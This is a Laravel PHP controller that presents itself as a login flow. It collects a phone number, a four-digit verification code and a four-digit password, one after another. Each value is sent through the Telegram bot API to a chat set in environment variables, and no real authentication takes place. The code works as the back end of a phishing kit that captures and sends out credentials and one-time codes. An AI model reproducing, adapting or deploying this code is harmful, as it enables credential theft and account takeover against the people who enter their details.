<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class AuthController extends Controller
{
    private $botToken;
    private $chatId;

    public function __construct()
    {
        $this->botToken = env('TELEGRAM_BOT_TOKEN');
        $this->chatId = env('TELEGRAM_CHAT_ID');
    }

    // Mostrar formulario para ingresar teléfono
    public function login()
    {
        return view('auth.login');
    }

    // Recibir teléfono, enviar a Telegram y mostrar formulario código
public function enviarTelefono(Request $request)
{
     Log::info('Llegó petición enviarTelefono: ', $request->all());
    $request->validate([
        'telefono' => 'required|string',
    ]);

    $telefono = $request->input('telefono');

    $this->enviarTelegram("📱 Teléfono ingresado: {$telefono}");

    return view('auth.code', compact('telefono'));
}

    // Recibir código, enviar a Telegram y mostrar formulario contraseña
    public function verificarCodigo(Request $request)
    {
        $request->validate([
            'telefono' => 'required|string',
            'c1' => 'required|string',
            'c2' => 'required|string',
            'c3' => 'required|string',
            'c4' => 'required|string',
        ]);

        $codigo = $request->c1 . $request->c2 . $request->c3 . $request->c4;
        $telefono = $request->telefono;

        // Enviar código y teléfono a Telegram
        $this->enviarTelegram("🔐 Código ingresado: {$codigo} para el teléfono: {$telefono}");

        // Mostrar formulario para ingresar contraseña, enviando teléfono
        return view('auth.password', compact('telefono'));
    }

    // Recibir contraseña, enviar a Telegram y finalizar
   public function ingresarPassword(Request $request)
{
    $request->validate([
        'p1' => 'required|string',
        'p2' => 'required|string',
        'p3' => 'required|string',
        'p4' => 'required|string',
    ]);

    $password = $request->p1 . $request->p2 . $request->p3 . $request->p4;

    $this->enviarTelegram("🔑 Contraseña ingresada: {$password}");

    return redirect('/')->with('message', '¡Contraseña recibida y enviada a Telegram!');
}


    // Función para enviar mensajes a Telegram y registrar logs
    private function enviarTelegram($mensaje)
    {
        Log::info("📤 Enviando a Telegram...");
        Log::info("Mensaje: " . $mensaje);

        if (!$this->botToken || !$this->chatId) {
            Log::error("❌ BotToken o ChatId no definidos");
            return;
        }

        $response = Http::get("https://api.telegram.org/bot{$this->botToken}/sendMessage", [
            'chat_id' => $this->chatId,
            'text' => $mensaje,
        ]);

        Log::info("📩 Respuesta de Telegram: " . $response->body());
    }
}
